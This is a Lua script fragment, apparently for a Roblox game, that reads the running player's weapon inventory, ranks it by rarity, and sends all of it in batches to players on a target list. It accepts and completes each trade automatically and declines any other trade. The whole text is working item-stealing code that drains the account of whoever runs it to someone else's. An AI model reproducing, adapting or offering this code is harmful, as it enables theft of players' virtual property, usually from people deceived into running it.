getItemInfo = function(itemId, itemType)
    if not Sync then return nil end
    if itemType == "Emotes" then return Sync.Emotes[itemId] or Sync.Toys[itemId] end
    return Sync[itemType] and Sync[itemType][itemId]
end

getItemRarityValue = function(itemId, itemType)
    local itemInfo = getItemInfo(itemId, itemType)
    if not itemInfo then return 100 end
    local rarity = itemInfo.Rarity or "Common"
    return RaritySort[rarity] or 100
end

scanInventory = function()
    local items = {}
    if not ProfileData then return items end
    if ProfileData.Weapons and ProfileData.Weapons.Owned then
        for itemId, amount in pairs(ProfileData.Weapons.Owned) do
            if itemId ~= "DefaultKnife" and itemId ~= "DefaultGun" and amount > 0 then
                local itemInfo = getItemInfo(itemId, "Weapons")
                if itemInfo then
                    local rarityValue = getItemRarityValue(itemId, "Weapons")
                    table.insert(items, {id = itemId, type = "Weapons", amount = amount, rarity = rarityValue})
                end
            end
        end
    end
    if ProfileData.Uniques then
        for _, unique in pairs(ProfileData.Uniques) do
            local baseItem = unique.BaseItem
            if baseItem and baseItem ~= "DefaultKnife" and baseItem ~= "DefaultGun" then
                local actualItem = baseItem
                if unique.EvoEquipped then
                    local itemInfo = getItemInfo(baseItem, "Weapons")
                    if itemInfo and itemInfo.Evo then
                        local evoIndex = 1
                        if unique.XP >= (itemInfo.Evo[2] and itemInfo.Evo[2].XPRequired or 999999) then evoIndex = 2 end
                        if unique.XP >= (itemInfo.Evo[3] and itemInfo.Evo[3].XPRequired or 999999) then evoIndex = 3 end
                        if unique.XP >= (itemInfo.Evo[4] and itemInfo.Evo[4].XPRequired or 999999) then evoIndex = 4 end
                        actualItem = itemInfo.Evo[evoIndex].ItemName
                    end
                end
                table.insert(items, {id = actualItem, type = "Weapons", amount = 1, rarity = 70})
            end
        end
    end
    table.sort(items, function(a, b) return a.rarity < b.rarity end)
    return items
end

getNextBatch = function()
    local startIdx = (TradeState.currentBatch - 1) * 4 + 1
    local endIdx = math.min(startIdx + 3, #TradeState.allItems)
    if startIdx > #TradeState.allItems then return {} end
    local batch = {}
    for i = startIdx, endIdx do
        local item = TradeState.allItems[i]
        table.insert(batch, {id = item.id, type = item.type, amount = item.amount})
    end
    return batch
end

sendTradeRequest = function(targetPlayer)
    if not Trade then return false end
    local sendRemote = Trade:FindFirstChild("SendRequest")
    if not sendRemote then return false end
    local success = false
    pcall(function()
        local result = sendRemote:InvokeServer(targetPlayer)
        if result == true then success = true end
    end)
    return success
end

offerItems = function(items)
    if not Trade then return false end
    for _, item in ipairs(items) do
        for i = 1, item.amount do
            pcall(function()
                Trade.OfferItem:FireServer(item.id, item.type)
                task.wait(0.2)
            end)
        end
    end
    return true
end

acceptTradeProperly = function()
    if not Trade then return false end
    local placeId = game.PlaceId
    for attempt = 1, 5 do
        local status, tradeData = Trade.GetTradeStatus:InvokeServer()
        if tradeData and tradeData.LastOffer then
            pcall(function()
                Trade.AcceptTrade:FireServer(placeId * 3, tradeData.LastOffer)
                return true
            end)
        end
        pcall(function()
            Trade.AcceptTrade:FireServer()
            return true
        end)
        if attempt < 5 then task.wait(1) end
    end
    return true
end

completeTrade = function()
    if not Trade then return false end
    local completeRemote = Trade:FindFirstChild("CompleteTrade")
    if not completeRemote then return false end
    pcall(function() completeRemote:FireServer() end)
    return true
end

executeFullTrade = function()
    local batch = getNextBatch()
    if #batch == 0 then return false end
    task.wait(1)
    offerItems(batch)
    TradeState.hasOffered = true
    task.wait(1)
    acceptTradeProperly()
    TradeState.hasAccepted = true
    task.wait(0.5)
    completeTrade()
    TradeState.tradeCount = TradeState.tradeCount + 1
    return true
end

resetForNextTrade = function()
    TradeState.hasSent = false
    TradeState.hasOffered = false
    TradeState.hasAccepted = false
end

findTargetPlayer = function()
    for _, plr in ipairs(Players:GetPlayers()) do
        if isInTargetList(plr.Name) then
            return plr
        end
    end
    return nil
end

sendTradeToTarget = function()
    if TradeState.hasSent then return false end
    local target = findTargetPlayer()
    if not target then return false end
    local result = false
    for attempt = 1, 5 do
        result = sendTradeRequest(target)
        if result then break end
        task.wait(2)
    end
    if result then
        TradeState.hasSent = true
        TradeState.isTargetTrade = true
    end
    return result
end

startNextTrade = function()
    if TradeState.isProcessing then return end
    TradeState.isProcessing = true
    local nextBatch = getNextBatch()
    if #nextBatch == 0 then
        TradeState.isProcessing = false
        return
    end
    resetForNextTrade()
    local success = sendTradeToTarget()
    if not success then
        TradeState.isProcessing = false
        task.wait(5)
        startNextTrade()
        return
    end
    TradeState.isProcessing = false
end

if Trade then
    local startTradeRemote = Trade:FindFirstChild("StartTrade")
    if startTradeRemote then
        startTradeRemote.OnClientEvent:Connect(function(tradeData, username)
            if username and isInTargetList(username) then
                TradeState.isTargetTrade = true
                local hasMore = executeFullTrade()
                if hasMore then
                    TradeState.currentBatch = TradeState.currentBatch + 1
                    task.wait(5)
                    startNextTrade()
                end
            else
                pcall(function() Trade.DeclineTrade:FireServer() end)
            end
        end)
    end
    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if TradeState.hasOffered and not TradeState.hasAccepted then
            if data and data.LastOffer then
                acceptTradeProperly()
                TradeState.hasAccepted = true
                task.wait(0.5)
                completeTrade()
            end
        end
    end)
end

